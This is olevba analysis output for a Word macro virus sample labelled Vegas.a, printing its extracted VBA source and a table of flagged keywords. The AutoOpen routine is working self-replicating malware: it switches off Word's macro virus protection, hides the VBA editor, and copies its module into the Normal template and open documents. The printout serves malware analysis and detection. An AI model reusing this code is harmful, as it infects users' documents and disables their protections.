olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vegas.a-1e3b4d884f4c6cda4d66e8fa844fd2d9c659add8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vegas.a-1e3b4d884f4c6cda4d66e8fa844fd2d9c659add8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Vegas.bas 
in file: Virus.MSWord.Vegas.a-1e3b4d884f4c6cda4d66e8fa844fd2d9c659add8 - OLE stream: 'Macros/VBA/Vegas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Public Declare Function ExitWindows Lib "user32" (ByVal dwReserved As Long, ByVal uReturnCode As Long) As Long
Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long

Sub ShowFreeSpace(drvpath)
    Dim fs, d, s
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set d = fs.GetDrive(fs.GetDriveName(drvpath))
    s = "Drive " & UCase(drvpath) & " - "
    s = s & d.VolumeName & vbCrLf
    s = s & "Free Space: " & FormatNumber(d.FreeSpace / 1024, 0)
    s = s & " Kbytes"
    MsgBox s
End Sub




Sub ShowFolderList()
Dim fs, f, f1, fc, s, i, folderspec
    folderspec = "D:\"
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set f = fs.GetFolder(folderspec)
    Set fc = f.subfolders
    For i = 1 To fc.Count
    s = s & fc.Item(1)
    s = s & vbCrLf
    Next i
    MsgBox s
End Sub

Sub ShowFileList()
    Dim fs, f, f1, fc, s, folderspec
    Set fs = CreateObject("Scripting.FileSystemObject")
    folderspec = "D:\"
    Set f = fs.GetFolder(folderspec)
    Set fc = f.Files
    For Each f1 In fc
        s = s & f1.Name
        s = s & vbCrLf
    Next
    MsgBox s
End Sub


Sub ShowDriveType()
Dim fs, d, dd, dc, n, s, t
Dim fe, drvpath
    drvpath = "d:\"
    Set fs = CreateObject("Scripting.FileSystemObject")
    'Set d = fs.GetDrive(drvpath)
    Set dc = fs.Drives
    For Each d In dc
        s = s & d.DriveLetter & " - "
        Select Case d.DriveType
        Case 0: t = "Unknown"
        Case 1: t = "Removable"
        Case 2: t = "Fixed"
        Case 3: t = "Network"
        Case 4: t = "CD-ROM"
        Case 5: t = "RAM Disk"
        End Select
        If d.DriveType = 1 Then
            n = d.ShareName
        Else
            n = d.VolumeName
        End If
        s = s & "Drive " & d.DriveLetter & ": - " & t & " - " & n & vbCrLf
    Next
    MsgBox s
End Sub

Sub qw()
Call ShowDriveType("d:\")
End Sub

Sub ShowFileSize()
    Dim fs, f, s, filespec
    Set fs = CreateObject("Scripting.FileSystemObject")
    filespec = "d:\pass.exe"
    Set f = fs.GetFile(filespec)
    s = UCase(f.Name) & " is a " & f.Type
    MsgBox s, 0, "File Size Info"
End Sub


Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRr000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "Vegas" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "Vegas" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
ActiveDocument.Save
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
End Sub

Sub AutoExec()
End Sub

Sub Fileprint()
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSave()
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |pass.exe            |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

